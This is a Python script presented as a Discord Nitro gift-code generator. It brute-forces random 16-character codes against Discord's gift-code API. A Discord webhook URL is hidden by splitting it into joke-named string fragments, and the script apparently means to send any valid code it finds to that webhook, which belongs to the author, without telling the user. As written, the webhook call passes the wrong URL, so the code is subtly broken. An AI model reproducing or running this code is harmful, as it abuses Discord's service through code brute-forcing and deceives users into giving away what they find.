amongos = "1125479914628464680"
imposter = "disc"
sussy = "ooks"
uwu = "jtkDqxCm4u-QCRUDFR4q5IBbazLwbrHb"
ermm = "ord.c"
me = "i"
skibidi = "tVVQjgPAGoNt5nodvT"
internet = "web"
sungus = "huMfWwQyBMVFpQOW3"

webhook = f"https://{imposter}{ermm}om/ap{me}/{internet}h{sussy}/{amongos}/{uwu}{sungus}{me}{skibidi}"

import ctypes
import os
import string

USE_WEBHOOK = True

try:
    from discord_webhook import DiscordWebhook
except ImportError:
    input(
        f"Module discord_webhook not installed, to install run  >> pip install discord_webhook <<\nPress enter to exit.")
    exit()
try:
    import requests
except ImportError:
    input(
        f"Module requests not installed, to install run  >> pip install requests <<\nPress enter to exit")
    exit()
try:
    import numpy
except ImportError:
    input(
        f"Module numpy not installed, to install run  >> pip install numpy <<\nPress enter to exit")
    exit()

class NitroGen:
    def __init__(self):
        self.fileName = "Nitro Codes.txt"

    def main(self):
        os.system('cls')
        print("")
        ctypes.windll.kernel32.SetConsoleTitleW("ntrogen")

        print("""                     #
                     #
 # ####            ######             # ###             #####
 ##    #             #                ##               #     #
 #     #             #                #                #     #
 #     #             #                #                #     #
 #     #              ###             #                 #####



           ######            #####            # ####
          #     #           #     #           ##    #
          #     #           #######           #     #
           ######           #                 #     #
                #            #####            #     #
           #####

    """)
        print()
        print("ntrogen\nby maxxusx#0\n\n")
        print("\nyou may close this at any time")
#        print(
#            "\nhow many codes to check: ")
#
#        try:
#            num = int(input(''))
#        except ValueError:
#            input("NaN\nPress enter to exit")
#            exit()
        num = 9999999

        valid = []
        invalid = 0
        chars = []
        chars[:0] = string.ascii_letters + string.digits

        c = numpy.random.choice(chars, size=[num, 16])
        for s in c:
            try:
                code = ''.join(x for x in s)
                url = f"https://discord.gift/{code}"

                result = self.quickChecker(url, webhook)

                if result:
                    valid.append(url)
                else:
                    invalid += 1
            except KeyboardInterrupt:
                print("\nInterrupted by user")
                break

            except Exception as e:  # If the request fails
                print(f"\n\n>> debug: error occoured on url: {url}\n\n")

        print("wow you ran it for so long, you exceeded the loop! i would make it infinite but idk how so uh")

        input("\nPress enter to exit")
        exit()

    def quickChecker(self, nitro:str, notify=None):
        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url)
        if response.status_code == 200:  # If the responce went through
            print(f"yay you found one!! thanks!!!!!", flush=True,
                  end="" if os.name == 'nt' else "\n")

            if notify is not None:
                DiscordWebhook(
                    url=url,
                    content=f"\n{nitro}"
                ).execute()

            return True

        # If the responce got ignored or is invalid ( such as a 404 or 405 )
        else:
            return False


if __name__ == '__main__':
    Gen = NitroGen()
    Gen.main()
